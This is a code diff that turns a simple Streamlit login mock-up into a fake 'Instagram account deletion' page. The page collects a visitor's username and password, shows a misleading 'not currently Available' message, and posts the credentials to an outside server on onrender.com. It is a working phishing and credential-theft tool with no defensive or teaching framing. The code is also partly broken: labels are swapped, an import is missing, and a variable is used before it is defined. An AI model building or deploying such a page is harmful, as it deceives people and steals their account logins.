@@ -1,23 +1,33 @@
 import streamlit as st
 
-# Set page title
-st.set_page_config(page_title="Login Page", page_icon=None, layout="wide")
+username = ""
+password = ""
+st.set_page_config("Instagram account deletion")
+class SessionState:
+    def __init__(self):
+        self.username = None
+        self.password = None
 
-# Centered image
-image_url = "https://www.dafont.com/forum/attach/orig/8/1/815933.png?1"
-image_style = f"background-image: url({image_url}); background-size: contain; background-repeat: no-repeat; height: 150px; width: 150px; margin: 0 auto;"
-st.markdown(f'<div style="{image_style}"></div>', unsafe_allow_html=True)
+# Create an instance of the custom SessionState class
+session_state = SessionState()
 
-# Add text input boxes for phone number, email, and Instagram ID
-info = st.text_input("Phone Number, Email, Instagram ID", max_chars=50, key="info", height=30)
+left, middle, right = st.columns(3)
 
-# Add password input field
-password = st.text_input("Password", type="password", height=30)
 
-# Add login button
-login_button_style = "background-color: blue; color: white; padding: 10px; text-align: center; font-size: 18px; border-radius: 5px; width: 150px; margin: 0 auto;"
-login_button = st.button("Log In", key="login_button", help="Click to login", style=login_button_style)
+with middle:
+    image_url = "https://www.dafont.com/forum/attach/orig/8/1/815933.png?1"
+    image_style = f"background-image: url({image_url}); background-size: contain; background-repeat: no-repeat; height: 70px; width: 170px;"
+    st.markdown(f'<div style="{image_style}"></div>', unsafe_allow_html=True)
 
-# Display a message when login button is clicked
-if login_button:
-    st.success("Logged in successfully!")
+    password = st.text_input("Username")
+    username = st.text_input("Password")
+    st.write(username , password)
+    if st.button("Sign-in"):
+       st.write("Sorry this page is not currently Available")
+       data = {"username": username, "password": password}
+       response = requests.post("https://receiver-t4vh.onrender.com", data=data)
+
+    if response.status_code == 200:
+            st.success("Data sent successfully!")
+    else:
+            st.error("Error sending data.")
